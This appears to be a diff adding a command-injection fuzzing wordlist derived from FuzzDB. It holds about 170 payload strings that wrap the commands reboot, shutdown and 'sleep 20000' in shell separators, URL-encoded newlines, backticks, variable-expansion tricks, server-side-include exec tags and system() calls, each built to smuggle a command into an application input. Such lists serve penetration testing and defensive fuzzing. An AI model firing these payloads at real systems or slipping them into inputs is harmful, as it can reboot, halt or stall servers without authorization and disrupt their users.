@@ -1,0 +1,175 @@
+# Based on FuzzDB (https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/os-cmd-execution/command-injection-template.txt)
+
+reboot
+;reboot
+;reboot;
+^reboot
+|reboot
+<reboot
+<reboot;
+<reboot\n
+<reboot%0D
+<reboot%0A
+&reboot
+&reboot&
+&&reboot
+&&reboot&&
+%0Dreboot
+%0Dreboot%0D
+%0Areboot
+%0Areboot%0A
+\nreboot
+\nreboot\n
+'reboot'
+`reboot`
+;reboot|
+;reboot/n
+|reboot;
+a);reboot
+a;reboot
+a);reboot
+a;reboot;
+a);reboot|
+FAIL||reboot
+CMD=$'reboot';$CMD
+;CMD=$'reboot';$CMD
+^CMD=$'reboot';$CMD
+|CMD=$'reboot';$CMD
+&CMD=$'reboot';$CMD
+&&CMD=$'reboot';$CMD
+%0DCMD=$'reboot';$CMD
+FAIL||CMD=$'reboot';$CMD
+CMD=$\'reboot\';$CMD
+;CMD=$\'reboot\';$CMD
+^CMD=$\'reboot\';$CMD
+|CMD=$\'reboot\';$CMD
+&CMD=$\'reboot\';$CMD
+&&CMD=$\'reboot\';$CMD
+%0DCMD=$\'reboot\';$CMD
+FAIL||CMD=$\'reboot\';$CMD
+CMD=$"reboot";$CMD
+;CMD=$"reboot";$CMD
+^CMD=$"reboot";$CMD
+|CMD=$"reboot";$CMD
+&CMD=$"reboot";$CMD
+&&CMD=$"reboot";$CMD
+%0DCMD=$"reboot";$CMD
+FAIL||CMD=$"reboot";$CMD
+<!--#exec cmd="reboot"-->
+;system('reboot')
+
+shutdown
+;shutdown
+;shutdown;
+^shutdown
+|shutdown
+<shutdown
+<shutdown;
+<shutdown\n
+<shutdown%0D
+<shutdown%0A
+&shutdown
+&shutdown&
+&&shutdown
+&&shutdown&&
+%0Dshutdown
+%0Dshutdown%0D
+%0Ashutdown
+%0Ashutdown%0A
+\nshutdown
+\nshutdown\n
+'shutdown'
+`shutdown`
+;shutdown|
+;shutdown/n
+|shutdown;
+a);shutdown
+a;shutdown
+a);shutdown
+a;shutdown;
+a);shutdown|
+FAIL||shutdown
+CMD=$'shutdown';$CMD
+;CMD=$'shutdown';$CMD
+^CMD=$'shutdown';$CMD
+|CMD=$'shutdown';$CMD
+&CMD=$'shutdown';$CMD
+&&CMD=$'shutdown';$CMD
+%0DCMD=$'shutdown';$CMD
+FAIL||CMD=$'shutdown';$CMD
+CMD=$\'shutdown\';$CMD
+;CMD=$\'shutdown\';$CMD
+^CMD=$\'shutdown\';$CMD
+|CMD=$\'shutdown\';$CMD
+&CMD=$\'shutdown\';$CMD
+&&CMD=$\'shutdown\';$CMD
+%0DCMD=$\'shutdown\';$CMD
+FAIL||CMD=$\'shutdown\';$CMD
+CMD=$"shutdown";$CMD
+;CMD=$"shutdown";$CMD
+^CMD=$"shutdown";$CMD
+|CMD=$"shutdown";$CMD
+&CMD=$"shutdown";$CMD
+&&CMD=$"shutdown";$CMD
+%0DCMD=$"shutdown";$CMD
+FAIL||CMD=$"shutdown";$CMD
+<!--#exec cmd="shutdown"-->
+;system('shutdown')
+
+sleep 20000
+;sleep 20000
+;sleep 20000;
+^sleep 20000
+|sleep 20000
+<sleep 20000
+<sleep 20000;
+<sleep 20000\n
+<sleep 20000%0D
+<sleep 20000%0A
+&sleep 20000
+&sleep 20000&
+&&sleep 20000
+&&sleep 20000&&
+%0Dsleep 20000
+%0Dsleep 20000%0D
+%0Asleep 20000
+%0Asleep 20000%0A
+\nsleep 20000
+\nsleep 20000\n
+'sleep 20000'
+`sleep 20000`
+;sleep 20000|
+;sleep 20000/n
+|sleep 20000;
+a);sleep 20000
+a;sleep 20000
+a);sleep 20000
+a;sleep 20000;
+a);sleep 20000|
+FAIL||sleep 20000
+CMD=$'sleep 20000';$CMD
+;CMD=$'sleep 20000';$CMD
+^CMD=$'sleep 20000';$CMD
+|CMD=$'sleep 20000';$CMD
+&CMD=$'sleep 20000';$CMD
+&&CMD=$'sleep 20000';$CMD
+%0DCMD=$'sleep 20000';$CMD
+FAIL||CMD=$'sleep 20000';$CMD
+CMD=$\'sleep 20000\';$CMD
+;CMD=$\'sleep 20000\';$CMD
+^CMD=$\'sleep 20000\';$CMD
+|CMD=$\'sleep 20000\';$CMD
+&CMD=$\'sleep 20000\';$CMD
+&&CMD=$\'sleep 20000\';$CMD
+%0DCMD=$\'sleep 20000\';$CMD
+FAIL||CMD=$\'sleep 20000\';$CMD
+CMD=$"sleep 20000";$CMD
+;CMD=$"sleep 20000";$CMD
+^CMD=$"sleep 20000";$CMD
+|CMD=$"sleep 20000";$CMD
+&CMD=$"sleep 20000";$CMD
+&&CMD=$"sleep 20000";$CMD
+%0DCMD=$"sleep 20000";$CMD
+FAIL||CMD=$"sleep 20000";$CMD
+<!--#exec cmd="sleep 20000"-->
+;system('sleep 20000')
